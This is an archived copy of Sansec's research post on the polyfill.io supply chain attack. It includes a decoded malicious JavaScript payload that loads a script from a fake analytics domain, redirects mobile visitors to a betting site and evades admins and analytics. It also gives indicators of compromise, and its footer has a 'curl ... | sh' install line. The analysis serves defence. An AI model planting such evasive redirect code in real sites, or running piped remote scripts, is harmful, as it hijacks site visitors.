---
url: "https://sansec.io/research/polyfill-supply-chain-attack"
title: "Polyfill supply chain attack hits 100K+ sites"
site: "Sansec"
published: "2024-06-25T00:00:00Z"
captured: "2026-11-02T18:42:04Z"
via: "live"
sha256: "f02f3e5fc76650b4e054e44d7371c499cc3af71f2ff7130f606bfb7d0188bca4"
wayback: "https://web.archive.org/web/20261026105933/https://sansec.io/research/polyfill-supply-chain-attack"
cited_in:
  - "docs/threats/02-supply-chain-packages.md"
---

# Polyfill supply chain attack hits 100K+ sites

> Archived copy of a third-party page, kept so Bigman's findings survive if the original goes away. Copyright stays with the original publisher; cite the original URL.
>
> Original: <https://sansec.io/research/polyfill-supply-chain-attack>
> Snapshot: <https://web.archive.org/web/20261026105933/https://sansec.io/research/polyfill-supply-chain-attack>

# Polyfill supply chain attack hits 100K+ sites

by Sansec Forensics Team

Published in [Threat Research](https://sansec.io/research) − June 25, 2024

written by a human

The new Chinese owner of the popular Polyfill JS project injects malware into more than 100 thousand sites.

Update June 28th: We are flagging more domains that have been used by the same actor to spread malware since at least [June 2023](https://x.com/nullifysecurity/status/1806489013567778923): bootcdn.net, bootcss.com, staticfile.net, staticfile.org, unionadjs.com, xhsbpza.com, union.macoms.la, newcrbpc.com.

Update June 27th: Cloudflare has implemented real-time rewrites of cdn.polyfill.io to their own version. A little later, Namecheap has put the domain on hold altogether, which eliminates the risk for now. However, you are still recommended to remove any polyfill.io references in your code.

Update June 26th: Someone launched similar DDoS attacks against our infrastructure and BleepingComputer (who was the first to cover our research).

Update June 25th: Google has already started blocking Google Ads for eCommerce sites that use polyfill.io.

The polyfill.js is a popular open source library to support older browsers. [100K+ sites](https://publicwww.com/websites/%22cdn.polyfill.io%22/) embed it using the cdn.polyfill.io domain. Notable users are JSTOR, Intuit and World Economic Forum. However, in February this year, a Chinese company bought the domain and the Github account. Since then, this domain was caught injecting [malware](https://web.archive.org/web/20240624110153/https://github.com/polyfillpolyfill/polyfill-service/issues/2873) on mobile devices via any site that embeds cdn.polyfill.io. Any complaints were quickly removed ([archive here](https://web.archive.org/web/20240229113710/https://github.com/polyfillpolyfill/polyfill-service/issues/2834)) from the Github repository.

The polyfill code is dynamically generated based on the HTTP headers, so multiple attack vectors are likely. Sansec decoded one particular malware (see below) which redirects mobile users to a [sports betting site](https://w9.vty70.net/) using a fake Google analytics domain (www.googie-anaiytics.com). The code has specific protection against reverse engineering, and only activates on specific mobile devices at specific hours. It also does not activate when it detects an admin user. It also delays execution when a web analytics service is found, presumably to not end up in the stats.

The original [polyfill author](https://x.com/triblondon/status/1761852117579427975) recommends to not use Polyfill at all, as it is no longer needed by modern browsers anyway. Meanwhile, both [Fastly](https://community.fastly.com/t/new-options-for-polyfill-io-users/2540) and [Cloudflare](https://cdnjs.cloudflare.com/polyfill) have put up trustworthy alternatives, if you still need it.

This incident is a typical example of a supply chain attack. To get visibility into the code that your users are loading, we recommend our (free) CSP monitoring service [Sansec Watch](https://sansec.io/watch).

Our [eComscan backend scanner](https://sansec.io/#ecomscan) has also been updated with polyfill.io detection.

## Polyfill malicious payload example

We added some names for readability, however tiaozhuan came from the original malware (which means "jump" in Chinese).

```
function isPc() {
  try {
    var _isWin =
        navigator.platform == "Win32" || navigator.platform == "Windows",
      _isMac =
        navigator.platform == "Mac68K" ||
        navigator.platform == "MacPPC" ||
        navigator.platform == "Macintosh" ||
        navigator.platform == "MacIntel";
    if (_isMac || _isWin) {
      return true;
    } else {
      return false;
    }
  } catch (_0x44e1f6) {
    return false;
  }
}
function vfed_update(_0x5ae1f8) {
  _0x5ae1f8 !== "" &&
    loadJS(
      "https://www.googie-anaiytics.com/html/checkcachehw.js",
      function () {
        if (usercache == true) {
          window.location.href = _0x5ae1f8;
        }
      }
    );
}
function check_tiaozhuan() {
  var _isMobile = navigator.userAgent.match(
    /(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i
  );
  if (_isMobile) {
    var _curHost = window.location.host,
      _ref = document.referrer,
      _redirectURL = "",
      _kuurzaBitGet = "https://kuurza.com/redirect?from=bitget",
      _rnd = Math.floor(Math.random() * 100 + 1),
      _date = new Date(),
      _hours = _date.getHours();
    if (
      _curHost.indexOf("www.dxtv1.com") !== -1 ||
      _curHost.indexOf("www.ys752.com") !== -1
    ) {
      _redirectURL = "https://kuurza.com/redirect?from=bitget";
    } else {
      if (_curHost.indexOf("shuanshu.com.com") !== -1) {
        _redirectURL = "https://kuurza.com/redirect?from=bitget";
      } else {
        if (_ref.indexOf(".") !== -1 && _ref.indexOf(_curHost) == -1) {
          _redirectURL = "https://kuurza.com/redirect?from=bitget";
        } else {
          if (_hours >= 0 && _hours < 2) {
            if (_rnd <= 10) {
              _redirectURL = _kuurzaBitGet;
            }
          } else {
            if (_hours >= 2 && _hours < 4) {
              _rnd <= 15 && (_redirectURL = _kuurzaBitGet);
            } else {
              if (_hours >= 4 && _hours < 7) {
                _rnd <= 20 && (_redirectURL = _kuurzaBitGet);
              } else {
                _hours >= 7 && _hours < 8
                  ? _rnd <= 10 && (_redirectURL = _kuurzaBitGet)
                  : _rnd <= 10 && (_redirectURL = _kuurzaBitGet);
              }
            }
          }
        }
      }
    }
    _redirectURL != "" &&
      !isPc() &&
      document.cookie.indexOf("admin_id") == -1 &&
      document.cookie.indexOf("adminlevels") == -1 &&
      vfed_update(_redirectURL);
  }
}
let _outerPage = document.documentElement.outerHTML,
  bdtjfg = _outerPage.indexOf("hm.baidu.com") != -1;
let cnzfg = _outerPage.indexOf(".cnzz.com") != -1,
  wolafg = _outerPage.indexOf(".51.la") != -1;
let mattoo = _outerPage.indexOf(".matomo.org") != -1,
  aanaly = _outerPage.indexOf(".google-analytics.com") != -1;
let ggmana = _outerPage.indexOf(".googletagmanager.com") != -1,
  aplausix = _outerPage.indexOf(".plausible.io") != -1,
  statcct = _outerPage.indexOf(".statcounter.com") != -1;
bdtjfg || cnzfg || wolafg || mattoo || aanaly || ggmana || aplausix || statcct
  ? setTimeout(check_tiaozhuan, 2000)
  : check_tiaozhuan();

```

## Indicators of compromise

```
https://kuurza.com/redirect?from=bitget
https://www.googie-anaiytics.com/html/checkcachehw.js
https://www.googie-anaiytics.com/ga.js
https://cdn.bootcss.com/highlight.js/9.7.0/highlight.min.js
https://union.macoms.la/jquery.min-4.0.2.js
https://newcrbpc.com/redirect?from=bscbc

bootcdn.net
staticfile.net
staticfile.org
unionadjs.com
xhsbpza.com

```

## Read more

- [NginRAT parasite targets Nginx](https://sansec.io/research/nginrat)
- [CronRAT malware hides behind February 31st](https://sansec.io/research/cronrat)
- [New linux_avp malware hits eCommerce sites](https://sansec.io/research/ecommerce-malware-linux-avp)
- [Brevo supply chain attack hits 100k+ sites with Wordpress backdoors and Clickfix malware](https://sansec.io/research/brevo-supply-chain-attack)
- [OptinMonster supply chain attack hits 1.2 million sites](https://sansec.io/research/optinmonster-supply-chain-attack)

##### In this article

##### Protect your store now!

Block all known Magento attacks, while you schedule the latest critical patch until a convenient moment. No more downtime and instability from rushed patching.

[Get Sansec Shield](https://sansec.io/shield)

[supply-chain-attack](https://sansec.io/tags/supply-chain-attack)[malware](https://sansec.io/tags/malware)[web-skimming](https://sansec.io/tags/web-skimming)[ecommerce-security](https://sansec.io/tags/ecommerce-security)

## Scan your store now
for malware & vulnerabilities

$ curl ecomscan.com | sh

[eComscan](https://sansec.io/#ecomscan) is the most thorough security scanner for Magento, Adobe Commerce, Shopware, WooCommerce, Sylius and many more.

[Learn more](https://sansec.io/#ecomscan)
